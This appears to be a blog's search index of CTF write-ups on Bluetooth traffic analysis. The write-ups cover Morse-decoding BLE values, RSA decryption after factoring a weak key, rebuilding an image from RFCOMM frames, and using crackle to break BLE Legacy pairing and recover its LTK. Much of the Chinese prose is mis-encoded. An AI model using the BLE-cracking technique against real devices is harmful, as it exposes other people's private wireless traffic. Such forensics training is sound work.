<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Teslaaaaa</title>
    <link href="/2023/11/27/2020%E7%BD%91%E9%BC%8E%E6%9D%AFTeslaaaaa/"/>
    <url>/2023/11/27/2020%E7%BD%91%E9%BC%8E%E6%9D%AFTeslaaaaa/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/Teslaaaaa/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¦è”ç½‘å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›è“ç‰™æµé‡åˆ†æ</title>
    <link href="/2023/11/26/%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F/"/>
    <url>/2023/11/26/%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›åˆèµ›"><a href="#2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›åˆèµ›" class="headerlink" title="2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›åˆèµ›"></a>2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›åˆèµ›</h2><h3 id="Are-you-ok"><a href="#Are-you-ok" class="headerlink" title="Are you ok"></a>Are you ok</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯ä¹±ç ï¼Œä½†æ ¹æ®å…¶ä¸­çš„æ˜æ–‡<code>HUAWEI P10 Plus</code>å’Œ<code>Mi Smart Band 5</code>çŒœæµ‹æ˜¯è“ç‰™æµé‡ï¼Œç”¨Wiresharkæ‰“å¼€ã€‚<br>å¤§æ¦‚è¿‡ç¨‹æ˜¯åˆšå¼€å§‹ä¸¤å°è®¾å¤‡è¿›è¡Œäº†è®¤è¯é€šä¿¡ï¼Œç„¶åäº’ç›¸å‘é€äº†ä¸€äº›ä¿¡æ¯ï¼Œå®åœ¨çœ‹ä¸æ‡‚è“ç‰™æµé‡ğŸ˜’<br>åœ¨è¿™é‡Œæˆ‘ä»¬ç›´æ¥æ ¹æ®<code>info</code>æ’åºï¼Œå‘ç°Handleä¸º<code>0x0026</code>çš„é€šä¿¡æœ€é•¿ï¼Œç¬¦åˆflagçš„ç‰¹å¾<br><img src="/mdimg/Bluetooth/1.png"><br>é€šè¿‡è§‚å¯Ÿå‘ç°ï¼ŒOpcodeçš„Valueæœ‰<code>0x00</code>ï¼Œ<code>0x01</code>ï¼Œ<code>0x02</code>ä¸‰ç§ï¼ŒçŒœæµ‹æ˜¯è«æ–¯ç¼–ç </p><table><thead><tr><th align="center">Value</th><th align="center">0x00</th><th align="center">0x01</th><th align="center">0x02</th></tr></thead><tbody><tr><td align="center">Morse</td><td align="center">.</td><td align="center">-</td><td align="center">/</td></tr></tbody></table><p>å†™è„šæœ¬å°†æ‰€æœ‰é€šä¿¡è¿‡ç¨‹æ‰“å°å‡ºæ¥ï¼Œå¹¶è½¬åŒ–ä¸ºMorseç”µç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;1.pcap&#x27;</span>, display_filter = <span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    opcode = <span class="hljs-built_in">str</span>(pkt.btatt.value)<br>    <span class="hljs-keyword">if</span> opcode == <span class="hljs-string">&#x27;00&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;.&#x27;</span><br>    <span class="hljs-keyword">elif</span> opcode == <span class="hljs-string">&#x27;01&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;-&#x27;</span><br>    <span class="hljs-keyword">elif</span> opcode == <span class="hljs-string">&#x27;02&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;/&#x27;</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># .../--../--../--./...-/--/./...../-----</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/Bluetooth/2.png"></p><h2 id="Cyber-Apocalypse-2021"><a href="#Cyber-Apocalypse-2021" class="headerlink" title="Cyber Apocalypse 2021"></a>Cyber Apocalypse 2021</h2><h3 id="Low-Energy-Crypto"><a href="#Low-Energy-Crypto" class="headerlink" title="Low Energy Crypto"></a>Low Energy Crypto</h3><p>ç›´æ¥æ ¹æ®<code>info</code>æ’åºï¼Œå‘ç°Handleä¸º<code>0x0016</code>çš„é€šä¿¡ä¸­æœ‰ä¸€ä¸ªRSAçš„å…¬é’¥<br><img src="/mdimg/Bluetooth/3.png"><br>å°†å…¬é’¥å¯¼å‡º</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br>MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m<br>B9fjj4tlGekPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/<span class="hljs-number">3L</span>i<br><span class="hljs-number">4l</span>+RI2g0FqJvf3ff<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><p>ç”¨opensslè½¬æ¢ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(g0atã‰¿kali)-[~/æ¡Œé¢]<br>â””â”€$ openssl rsa -<span class="hljs-keyword">in</span> 2.key -text -inform PEM -pubin<br>Public-Key: (512 bit)<br>Modulus:<br>    00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:<br>    59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:<br>    1a:43:ce:5b:e7:<span class="hljs-built_in">fc</span>:24:6c:e0:60:94:56:6e:87:a4:<br>    72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:<br>    44:09:d4:a8:09<br>Exponent:<br>    00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:<br>    77:<span class="hljs-built_in">df</span><br>writing RSA key<br>-----BEGIN PUBLIC KEY-----<br>MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m<br>B9fjj4tlGkPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li<br>4l+RI2g0FqJvf3ff<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>å¾€ä¸‹çœ‹ï¼Œåœ¨Handleä¸º<code>0x0014</code>çš„é€šä¿¡ä¸­å‘ç°å¯†æ–‡<br><img src="/mdimg/Bluetooth/4.png"><br><img src="/mdimg/Bluetooth/5.png"><br>åˆ‡æ¢ä¸ºåŸå§‹å­˜å‚¨ï¼Œæ‰‹åŠ¨å»æ‰0å³å¯å¯†æ–‡c<br><img src="/mdimg/Bluetooth/6.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:</span><br><span class="hljs-string">59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:</span><br><span class="hljs-string">1a:43:ce:5b:e7:fc:24:6c:e0:60:94:56:6e:87:a4:</span><br><span class="hljs-string">72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:</span><br><span class="hljs-string">44:09:d4:a8:09</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>m=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:</span><br><span class="hljs-string">77:df</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>x=<span class="hljs-string">&quot;392969b018ffa093b9ab5e45ba86b4aa070e78b839abf11377e783626d7f9c4091392aef8e13ae9a22844288e2d27f63d2ebd0fb90871016fde87077d50ae538&quot;</span><br><br>n = s.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>e = m.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>n = <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)<br>e = <span class="hljs-built_in">int</span>(e, <span class="hljs-number">16</span>)<br>c = <span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#factorDBåˆ†è§£ä¸€ä¸‹n</span><br>p = <span class="hljs-number">92270847179792937622745249326651258492889546364106258880217519938223418249279</span><br>q = <span class="hljs-number">92270847179792937622745249326651258492889546364106258880217519938223418258871</span><br><br><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>phi_n=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=libnum.invmod(e,phi_n)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#CHTB&#123;5p34k_fr13nd_4nd_3n73r&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CVVD-2022æ™ºèƒ½ç½‘è”æ±½è½¦æ¼æ´æŒ–æ˜èµ›"><a href="#CVVD-2022æ™ºèƒ½ç½‘è”æ±½è½¦æ¼æ´æŒ–æ˜èµ›" class="headerlink" title="CVVD 2022æ™ºèƒ½ç½‘è”æ±½è½¦æ¼æ´æŒ–æ˜èµ›"></a>CVVD 2022æ™ºèƒ½ç½‘è”æ±½è½¦æ¼æ´æŒ–æ˜èµ›</h2><h3 id="è“ç‰™é’¥åŒ™çš„æ˜¥å¤©"><a href="#è“ç‰™é’¥åŒ™çš„æ˜¥å¤©" class="headerlink" title="è“ç‰™é’¥åŒ™çš„æ˜¥å¤©"></a>è“ç‰™é’¥åŒ™çš„æ˜¥å¤©</h3><p>ä¸€ä¸ªè“ç‰™æµé‡åŒ…ï¼Œéšä¾¿ç¿»ç¿»å‘ç°å­˜åœ¨ SMP åè®®ï¼Œå…¨ç§°æ˜¯ Secure Manager Protocolï¼Œæ˜¯è“ç‰™ç”¨æ¥å®šä¹‰é…å¯¹å’Œå¯†é’¥åˆ†å‘çš„ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« <a href="http://t.csdnimg.cn/VMihl">http://t.csdnimg.cn/VMihl</a></p><p>å¦å¤–å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œä½¿ç”¨äº†BlUETOOTH_LE_LLå¸§ã€‚</p><p><img src="/mdimg/Bluetooth/7.png"></p><p>ç”±äºé…å¯¹åçš„æµé‡æ˜¯è¢«åŠ å¯†çš„ï¼Œæ‰€ä»¥è¿™é‡Œçœ‹ä¸åˆ°ä»–ä»¬ä¼ è¾“äº†ä»€ä¹ˆä¿¡æ¯ï¼Œä½†æ˜¯æœ‰ä¸ªå·¥å…· crackle æ˜¯å¯ä»¥è§£å¯†è¿™ç§æ•°æ®åŒ…çš„ï¼Œè¿™ä¸ªå·¥å…·è§£å¯†è“ç‰™æµé‡æœ‰ä¸‰ä¸ªå‰æï¼Œè¿™ä¹Ÿåœ¨å®˜æ–¹çš„ FAQ ä¸­æåˆ°äº†ï¼š<br><a href="https://github.com/mikeryan/crackle/blob/master/FAQ.md">https://github.com/mikeryan/crackle/blob/master/FAQ.md</a></p><p>When should I use Crackle?</p><p>Crackle is useful when you have sniffed a BLE connection that uses Link Layer encryption and LE Legacy pairing. Before attempting to use Crackle, itâ€™s worth asking the following questions:</p><ol><li>Can I log the data without having to sniff it at all?</li><li>If not, is my device actually using Link Layer encryption?</li><li>Is the device using Legacy Pairing or LE Secure Connections?</li></ol><p>If the answers to these questions are â€œnoâ€, â€œyesâ€, and â€œlegacy pairingâ€, Crackle is the right tool for the job.</p><p>ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯ï¼šä½¿ç”¨é“¾è·¯å±‚åŠ å¯†å’Œ LE Legacy é…å¯¹çš„ BLE è¿æ¥æ—¶ï¼ŒCrackle éå¸¸æœ‰ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/arunima06/crackle.git<br><br><span class="hljs-built_in">cd</span> crackle<br><br>sudo apt-get install libpcap-dev<br><br>make<br><br>sudo make install<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ·»åŠ äº†BlUETOOTH_LE_LLå¸§æ”¯æŒçš„è€å“¥çš„å·¥å…·è§£å¯†æµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">g0at@Ubuntu22:~/æ¡Œé¢$ crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o de.pcapng<br>PCAP contains [BLUETOOTH_LE_LL] frames<br>Found 1 connection<br><br>Analyzing connection 0:<br>  7e:6f:08:2a:8d:36 (random) -&gt; 34:15:13:87:bf:e9 (public)<br>  Found 51 encrypted packets<br>  Cracking with strategy 0, 20 bits of entropy<br><br>  !!!<br>  TK found: 000000<br>  ding ding ding, using a TK of 0! Just Cracks(tm)<br>  !!!<br><br>  Decrypted 51 packets<br>  LTK found: 34f4bcd107ad8f6833acf01059719d8b<br><br>Decrypted 51 packets, dumping to PCAP<br>Done, processed 1494 total packets, decrypted 51<br></code></pre></td></tr></table></figure><p>å†æ‰“å¼€è§£å¯†åçš„æµé‡åŒ…ï¼Œå¯ä»¥çœ‹åˆ°Handleä¸º<code>0x0012</code>å¤„å·²ç»æœ‰æ•°æ®</p><p><img src="/mdimg/Bluetooth/8.png"></p><p>æ‹¿åˆ°èµ›åšå¨å­çš„é­”æœ¯æ£’æ˜¾ç¤ºï¼Œè§£ä¸¤æ¬¡Hexå°±æ˜¯å­—ç¬¦ä¸²ï¼Œå¦å¤–å‘ç°Valueæœ‰ä¸€äº›é‡å¤</p><p><img src="/mdimg/Bluetooth/9.png"></p><p>ç„¶åå°±æ˜¯åŸºäºGPTçš„expæ„é€ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">import pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;de.pcapng&#x27;</span>, display_filter=<span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:/Wireshark/tshark&#x27;</span>)<br><br>values = []<br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    <span class="hljs-keyword">if</span> hasattr(pkt, <span class="hljs-string">&#x27;btatt&#x27;</span>) and hasattr(pkt.btatt, <span class="hljs-string">&#x27;value&#x27;</span>):<br>        <span class="hljs-comment"># å»æ‰å†’å·</span><br>        value_without_colon = pkt.btatt.value.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment"># åœ¨æ¯ä¸ªvalueåé¢åŠ ä¸Šæ¢è¡Œç¬¦</span><br>        value_with_newline = value_without_colon + <span class="hljs-string">&#x27;\n&#x27;</span><br>        values.append(value_with_newline)<br><br><span class="hljs-comment"># ä½¿ç”¨setå»é™¤é‡å¤çš„valueï¼Œç„¶åå†è½¬æ¢å›list</span><br>values = list(<span class="hljs-built_in">set</span>(values))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(values))<br><br><span class="hljs-comment"># å¯¹æ¯ä¸ªvalueå•ç‹¬è§£ä¸¤æ¬¡hexç¼–ç </span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values:<br>    decoded_value = bytes.fromhex(value).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    final_decoded_value = bytes.fromhex(decoded_value).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(final_decoded_value)<br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">3337333333363335333236333330363536353330</span><br><span class="hljs-string">3636364336313637374233393632363133333339</span><br><span class="hljs-string">33343334333136323634333433303744</span><br><span class="hljs-string">3633333733363633363133363633363233333336</span><br><span class="hljs-string"></span><br><span class="hljs-string">73652c0ee0</span><br><span class="hljs-string">c76ca6cb36</span><br><span class="hljs-string">flag&#123;9ba39</span><br><span class="hljs-string">441bd40&#125;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment">#flag&#123;9ba3973652c0ee0c76ca6cb36441bd40&#125;</span><br><span class="hljs-comment">#flag&#123;9ba39c76ca6cb3673652c0ee0441bd40&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›å†³èµ›"><a href="#2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›å†³èµ›" class="headerlink" title="2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›å†³èµ›"></a>2023æ•°å­—ä¸­å›½Â·æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›å†³èµ›</h2><h3 id="AreYouOK-Pro"><a href="#AreYouOK-Pro" class="headerlink" title="AreYouOK Pro"></a>AreYouOK Pro</h3><p>ä»ç„¶æ˜¯ç»™äº†ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œç”¨wiresharkæ‰“å¼€ï¼Œç®€å•è¿‡ä¸€éåº”è¯¥æ˜¯å°¼åº·ç›¸æœºå‘HUAWEI P30 Proå‘é€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œç”¨äº†RFCOMMåè®®<a href="http://t.csdnimg.cn/Kbzsl">ã€è“ç‰™RFCOMM åè®®ã€‘-CSDNåšå®¢</a></p><p>å¾€ä¸‹çœ‹ï¼Œä»932å¸§å¼€å§‹æœ‰æ•°æ®åœ¨ä¼ è¾“ï¼Œ</p><p><img src="/mdimg/Bluetooth/10.png"></p><p>åœ¨964å¸§ï¼Œç¡®å®šä¸ºä¼ è¾“çš„æ˜¯ä¸€å¼ jpgå›¾ç‰‡</p><p><img src="/mdimg/Bluetooth/11.png"></p><p>çœ‹åˆ°äº†jpgçš„æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥å›¾ç‰‡ä»968å¸§å¼€å§‹ä¼ è¾“</p><p><img src="/mdimg/Bluetooth/12.png"></p><p>è§‚å¯ŸDataæ•°æ®å‘ç°ï¼Œåé¢çš„é•¿åº¦å‡ä¸º680ï¼ˆçŒœæµ‹è¿™æ˜¯å•ä¸ªæ•°æ®å—æœ€å¤§å€¼ï¼‰åœ¨jpgæ–‡ä»¶å¤´å‰è¿˜æœ‰ä¸€æ®µæ•°æ®ï¼ŒçŒœæµ‹ä¼ è¾“è¿‡ç¨‹æ˜¯å°†æ–‡ä»¶åˆ†å—ä¼ è¾“ï¼Œæ¯å—å‰å‡æœ‰å›ºå®šçš„ä¼ è¾“æ ‡è¯†ç¬¦ï¼Œç¿»çœ‹Dataæ•°æ®ï¼Œåœ¨ä¸‹é¢ä¹Ÿå¤šæ¬¡å‘ç°<code>a5a50100</code>è¿™æ®µæ•°æ®ï¼Œ<code>_ws.col.protocol == &quot;RFCOMM&quot;</code>ç­›é€‰å‡ºRFCOMMä¼ è¾“æ•°æ®çš„è¿‡ç¨‹ï¼Œå¯¼å‡ºåˆ†ç»„ä¸ºjsonæ–‡ä»¶ã€‚</p><p><img src="/mdimg/Bluetooth/13.jpg"></p><p><img src="/mdimg/Bluetooth/14.png"></p><p>æ ¹æ®jsonæ–‡ä»¶æ ¼å¼å†™è„šæœ¬ï¼Œä»â€frame.numberâ€: â€œ968â€å›¾ç‰‡æ­£å¼ä¼ è¾“å¼€å§‹è¯»å–æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">import json<br><br><span class="hljs-comment"># æ‰“å¼€å¹¶è¯»å–JSONæ–‡ä»¶</span><br>with open(<span class="hljs-string">&quot;1.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br>    packets = json.load(f)<br><br>data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets:<br>    layers = packet[<span class="hljs-string">&quot;_source&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>]<br>    <span class="hljs-comment"># æ£€æŸ¥&quot;frame.number&quot;é”®æ˜¯å¦å­˜åœ¨ï¼Œä¸”å€¼å¤§äºç­‰äº968</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;frame.number&quot;</span> <span class="hljs-keyword">in</span> layers[<span class="hljs-string">&quot;frame&quot;</span>] and int(layers[<span class="hljs-string">&quot;frame&quot;</span>][<span class="hljs-string">&quot;frame.number&quot;</span>]) &gt;= 968:<br>        <span class="hljs-comment"># æ£€æŸ¥&quot;data&quot;é”®æ˜¯å¦å­˜åœ¨</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;data&quot;</span> <span class="hljs-keyword">in</span> layers:<br>            data += layers[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;data.data&quot;</span>].replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>data = data.split(<span class="hljs-string">&quot;a5a50100&quot;</span>)<br>newdata = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br>    newdata += x[8:]<br><br><span class="hljs-comment"># å°†newdataå­—ç¬¦ä¸²çš„ç¬¬24ä¸ªå­—ç¬¦ä¹‹åçš„éƒ¨åˆ†è¿›è¡Œhexè§£ç ï¼Œå¾—åˆ°ä¸€ä¸ªå­—èŠ‚ä¸²</span><br><span class="hljs-comment"># ç„¶åï¼Œå°†è¿™ä¸ªå­—èŠ‚ä¸²å†™å…¥åˆ°ä¸€ä¸ªåä¸º&quot;flag.jpg&quot;çš„æ–‡ä»¶ä¸­</span><br>with open(<span class="hljs-string">&quot;flag.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>    f.write(bytes.fromhex(newdata[24:]))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/Bluetooth/flag.jpg"></p><h2 id="ç¬¬ä¸ƒå±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›è½¦è”ç½‘å®‰å…¨é”¦æ ‡èµ›"><a href="#ç¬¬ä¸ƒå±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›è½¦è”ç½‘å®‰å…¨é”¦æ ‡èµ›" class="headerlink" title="ç¬¬ä¸ƒå±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›è½¦è”ç½‘å®‰å…¨é”¦æ ‡èµ›"></a>ç¬¬ä¸ƒå±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›è½¦è”ç½‘å®‰å…¨é”¦æ ‡èµ›</h2><h3 id="GAGA-TT"><a href="#GAGA-TT" class="headerlink" title="GAGA TT"></a>GAGA TT</h3><p>è¿™ä¸ªå°±å¤ªç®€å•äº†ï¼Œä¸€çœ¼ä¸çœŸï¼Œæ•°æ®åœ¨Handleä¸º<code>0x003b</code>ä¸­ï¼Œå¥—ç”¨ä¸Šé¢çš„è„šæœ¬ç›´æ¥æ¢­å“ˆ</p><p><img src="/mdimg/Bluetooth/15.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;IOT.pcapng&#x27;</span>, display_filter=<span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:/Wireshark/tshark&#x27;</span>)<br><br>values = 